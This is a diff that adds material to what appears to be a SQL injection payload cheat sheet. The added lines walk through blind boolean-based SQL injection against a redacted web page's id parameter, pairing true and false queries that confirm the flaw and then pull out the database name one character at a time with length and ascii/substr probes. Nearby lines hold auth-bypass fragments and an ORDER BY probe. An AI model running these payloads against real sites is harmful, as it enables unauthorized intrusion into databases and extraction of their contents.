@@ -182,6 +182,30 @@ or true--
 ") or ("x")=("x
 ")) or (("x"))=(("x
 ```
+>more example
+```
+false
+Confirming Blind Boolean-based SQLI:
+
+False Query:
+https://redacted.com/projects/projects-edit.html?id=879 AND 1=2 - -
+
+True Query:
+https://redacted.com/projects/projects-edit.html?id=879 AND 1=1 - -
+....
+FALSE Query:
+
+Copy
+https://redacted.com/projects/projects-edit.html?id=879 AND(length(database(0,1)))=1 -- -
+TRUE Query:
+https://redacted.com/projects/projects-edit.html?id=879 AND(length(database(0,1)))=12 -- -
+....
+FALSE QUERY:
+https://redacted.com/projects/projects-edit.html?id=879 AND(ascii(substr((select database()),1,1)))=97   -- -
+
+TRUE QUERY:
+https://redacted.com/projects/projects-edit.html?id=879 AND(ascii(substr((select database()),1,1)))=121   -- -
+
 >next order by
 ```
 ORDER BY 9
